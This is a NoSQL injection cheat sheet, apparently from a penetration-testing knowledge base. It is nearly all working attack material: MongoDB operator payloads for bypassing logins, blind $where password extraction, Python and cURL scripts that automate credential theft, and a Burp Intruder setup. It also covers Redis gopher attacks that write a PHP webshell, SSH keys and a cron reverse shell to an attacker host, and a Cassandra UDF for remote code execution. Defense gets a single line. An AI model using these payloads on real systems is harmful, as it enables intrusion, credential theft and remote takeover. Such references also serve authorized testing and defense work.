# NoSQL Injection — Cheat Sheet

Comprehensive payload reference. Quick reference / decision tree in `nosql-injection-quickstart.md`. Per-technique scenarios in `scenarios/nosql/`.

## Detection

### Syntax probes (string context)

```
'        "        \        '+'        "+"        '||'
test'    test"    test\    test'%2b'  test'%7c%7c'
```

### Operator probes (JSON body)

```json
{"username": {"$ne": ""}}
{"username": {"$ne": null}}
{"username": {"$gt": ""}}
{"username": {"$regex": ".*"}}
{"username": {"$exists": true}}
```

### Operator probes (URL-encoded)

```
username[$ne]=
username[$gt]=
username[$regex]=.*
username[$exists]=true
```

### Boolean tests (string context)

```
test' && '1'=='1                # true
test' && '1'=='2                # false
test'||1||'                     # always true
test'&&0&&'                     # always false
```

## Auth bypass

### MongoDB operators

```json
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$gte": ""}}
{"username": {"$regex": "admin"}, "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$nin": ["wrongpass"]}}
{"username": "admin", "password": {"$exists": true}}
```

### Syntax injection

```
admin'--                  admin'#                  admin'//                  admin'/*
admin' || '1'=='1         admin' || 1==1 || '
' || 1==1 || '            ' || true || '
admin' && '1'=='1
```

## Boolean blind / `$where` / Schema enum

```javascript
// Length / char-by-char / regex / charCodeAt
admin' && this.password.length == 8 || 'a'=='b
admin' && this.password[0]=='a' || 'a'=='b
admin' && this.password.charAt(0)=='a' || 'a'=='b
admin' && this.password.substring(0,1)=='a' || 'a'=='b
admin' && this.password.match('^a') || 'a'=='b
admin' && /^a/.test(this.password) || 'a'=='b
admin' && this.password.charCodeAt(0)>109 || 'a'=='b

// $where operator
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match('^a')"}
{"$where": "Object.keys(this).length > 0"}

// Schema enumeration
{"$where": "Object.keys(this).length == 5"}
{"$where": "Object.keys(this)[1].match('^.{0}u.*')"}
{"$where": "'resetToken' in this"}
{"$where": "this.hasOwnProperty('resetToken')"}
{"$where": "typeof this.resetToken === 'string'"}
{"$where": "this.resetToken.match('^.{0}a.*')"}
```

## URL encoding

`'`=`%27`, `"`=`%22`, `&`=`%26`, `|`=`%7c`, `=`=`%3d`, `[`/`]`=`%5b`/`%5d`, `{`/`}`=`%7b`/`%7d`, `$`=`%24`.

```
admin'%20%26%26%20'1'%3d%3d'1     # admin' && '1'=='1
admin'%7c%7c1%7c%7c'              # admin'||1||'
username%5B$ne%5D=                # username[$ne]=
```

## MongoDB operators reference

**Comparison:** `$eq`, `$ne`, `$gt`, `$gte`, `$lt`, `$lte`, `$in`, `$nin`.
**Logical:** `$and`, `$or`, `$not`, `$nor`.
**Element:** `$exists`, `$type`.
**Evaluation:** `$regex`, `$where`, `$expr`, `$mod`.
**Array:** `$all`, `$elemMatch`, `$size`.

## Burp Intruder

**Cluster Bomb (position × character):**
- Payload set 1: numbers 0–32 (positions).
- Payload set 2: `abcdefghijklmnopqrstuvwxyz0123456789` (chars).
- Grep Match: `Your username is:` / `Welcome back` / `Account locked`.
- Request: `{"username":"admin","password":"x","$where":"this.password[§0§]=='§a§'"}`

## Python / cURL automation

```python
# Boolean extraction
for pos in range(length):
    for c in string.ascii_lowercase + string.digits:
        p = f"{username}' && this.password[{pos}]=='{c}' || 'x'=='y"
        if "Your username is:" in requests.get(url, params={'user':p}).text:
            pw += c; break

# Binary search via charCodeAt
def bsearch(pos):
    low, high = 32, 126
    while low <= high:
        mid = (low+high)//2
        p = f"admin' && this.password.charCodeAt({pos})>{mid} || 'x'=='y"
        if "Your username is:" in requests.get(url, params={'user':p}).text: low = mid+1
        else: high = mid-1
    return chr(low)

# Operator injection
for op in [{"$ne":""},{"$gt":""},{"$regex":".*"},{"$exists":True}]:
    r = requests.post(url, json={"username":"administrator","password":op})
    if r.status_code == 200 and "Welcome" in r.text: print(f"[+] {op}")
```

```bash
curl -X POST http://target/login -H 'Content-Type: application/json' -d '{"username":"admin","password":{"$ne":""}}'
curl -X POST http://target/login -d 'username[$ne]=&password[$ne]='
```

## Redis (SSRF + gopher)

See `scenarios/nosql/redis-ssrf-gopher.md`.

```
gopher://127.0.0.1:6379/_<RESP-encoded commands>
```

Common goals:
- Webshell write: `SET 1 "<?php system($_GET['c']);?>" → CONFIG SET dir /var/www/html → CONFIG SET dbfilename shell.php → SAVE`.
- SSH key write: write `authorized_keys` to `/root/.ssh/`.
- Cron write: `\n* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1\n` to `/var/spool/cron/crontabs/root`.

Tool: `Gopherus --exploit redis`.

## Cassandra CQL / Status codes / Defense

See `scenarios/nosql/cassandra-cql.md`. Default creds `cassandra:cassandra`. UDF RCE (≤ 3.0):

```sql
' OR '1'='1
SELECT keyspace_name FROM system_schema.keyspaces;
CREATE OR REPLACE FUNCTION system.exec(inp text)
  CALLED ON NULL INPUT RETURNS text LANGUAGE java AS $$
    String[] cmd = {"/bin/sh","-c",inp};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
    return s.hasNext()?s.next():"";
  $$;
SELECT system.exec('id') FROM system.local;
```

**Status:** 200 possible success; 400 validation; 401 auth; 403 WAF; 429 rate; 500 syntax.

**Defense:** type validation; `mongo-sanitize`; ODM strict schemas; disable JS; no `$where` with user input; operator allowlist.

## References

`nosql-injection-quickstart.md`, `nosql-injection-advanced.md`, `nosql-injection-resources.md`, `scenarios/nosql/`. PayloadsAllTheThings/NoSQL.
